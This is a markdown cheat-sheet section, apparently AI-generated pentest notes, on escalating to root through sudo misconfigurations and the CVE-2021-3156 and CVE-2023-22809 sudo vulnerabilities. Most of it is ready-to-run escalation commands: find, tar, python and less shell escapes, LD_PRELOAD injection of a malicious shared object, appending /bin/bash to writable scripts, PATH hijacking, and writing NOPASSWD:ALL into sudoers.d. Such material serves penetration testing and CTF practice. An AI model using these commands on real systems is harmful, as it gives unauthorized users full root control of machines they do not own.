## 21. Advanced Sudo Misconfigurations & Version Exploits
```

You can paste this directly into your `.md`.

---

# 21. Advanced Sudo Misconfigurations & Version Exploits

---

## 🔎 21.1 Check Sudo Version (VERY IMPORTANT)

```bash id="0ch8d0"
sudo -V
```

Why?
Because many real-world root escalations are version-based.

---

## 💥 21.2 Baron Samedit (CVE-2021-3156)

Vulnerable:

```
sudo < 1.9.5p2
```

Check version:

```bash id="0g9r6n"
sudo --version
```

Impact:

* Heap overflow
* No sudo permissions required
* Direct root

Search exploit:

```bash id="l9v6qk"
searchsploit sudo 1.8
```

---

## 💣 21.3 Sudoedit Path Trick (CVE-2023-22809)

If sudo allows:

```
sudoedit /path/to/file
```

You may inject arbitrary file editing using environment manipulation.

Check:

```bash id="j7lwdq"
sudo -l
```

Look for:

```
sudoedit
```

---

## 🧨 21.4 RunAs Misconfiguration

Example:

```
User john may run the following commands:
    (root, www-data) /usr/bin/vim
```

If you can run as another privileged user:

```bash id="e1m5i3"
sudo -u www-data /usr/bin/vim
```

Then pivot from www-data to root.

---

## ⚠ 21.5 ALL but Restricted Command

Sometimes:

```
(ALL) ALL, !/bin/su
```

Admin tries to block `su`, but forgets:

You can still:

```bash id="4w6syo"
sudo /bin/bash
```

Blacklist ≠ secure.

---

## 🔓 21.6 NOPASSWD Misconfig

Check:

```bash id="m5l7q1"
sudo -l
```

If:

```
(ALL) NOPASSWD: /usr/bin/find
```

Exploit via GTFOBins:

```bash id="h3s4tq"
sudo find . -exec /bin/bash \; -quit
```

---

## 🧪 21.7 Sudo + Environment Variable Abuse

Check:

```bash id="8k2vaf"
sudo -l
```

Look for:

```
env_keep+=LD_PRELOAD
env_keep+=LD_LIBRARY_PATH
```

If allowed:

### LD_PRELOAD Escalation

1. Create malicious shared object.
2. Run:

```bash id="r2bq7x"
sudo LD_PRELOAD=./shell.so program
```

Boom → root.

---

## 🧨 21.8 Sudo with Writable Script

Example:

```
(ALL) NOPASSWD: /opt/script.sh
```

Check:

```bash id="p4k8yz"
ls -la /opt/script.sh
```

If writable:

```bash id="f9z6w2"
echo "/bin/bash" >> /opt/script.sh
sudo /opt/script.sh
```

Root shell.

---

## 🧠 21.9 Wildcard in Sudo

Example:

```
(ALL) NOPASSWD: /usr/bin/tar *
```

Dangerous.

Exploit:

```bash id="q3k9xt"
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## 🧬 21.10 Sudo with Relative Path

If sudo entry:

```
(ALL) NOPASSWD: backup.sh
```

No full path.

Exploit:

```bash id="v8m1qr"
echo "/bin/bash" > backup.sh
chmod +x backup.sh
export PATH=.:$PATH
sudo backup.sh
```

---

## 🔁 21.11 Sudo Can Run Python / Perl / Ruby

If allowed:

```
(ALL) NOPASSWD: /usr/bin/python3
```

Exploit:

```bash id="3c5n2p"
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Same for:

* perl
* ruby
* awk
* find
* vim
* less

Check GTFOBins.

---

## 🔍 21.12 Sudo + Less Abuse

If:

```
(ALL) NOPASSWD: /usr/bin/less
```

Run:

```bash id="g7p1kx"
sudo less /etc/profile
```

Inside less:

```
!bash
```

Root shell.

---

## 💣 21.13 Sudo Timestamp Abuse

If someone used sudo recently:

```bash id="x6q8nv"
sudo -l
```

If cached → no password needed.

Timeout controlled in:

```
/etc/sudoers
```

---

## 🧨 21.14 Sudoers.d Misconfig

Check:

```bash id="2v7c8t"
ls -la /etc/sudoers.d
```

If writable:

Add:

```
user ALL=(ALL) NOPASSWD:ALL
```

---

## ⚙ 21.15 SETENV Misconfiguration

If sudo shows:

```
(ALL) NOPASSWD:SETENV: /usr/bin/program
```

You can inject environment variables:

```bash id="z4m9qt"
sudo VAR=exploit /usr/bin/program
```

Very powerful.

---

## 🧬 21.16 Sudo + Editor Abuse

If allowed:

```
sudoedit /etc/passwd
```

You can sometimes:

* Replace root password hash
* Add new UID 0 user

---

## 🧠 21.17 Sudo + Service Command Abuse

If allowed:

```
(ALL) NOPASSWD: /usr/sbin/service apache2 restart
```

Check service file:

```bash id="c9k3rt"
cat /etc/systemd/system/apache2.service
```

If writable → inject command.
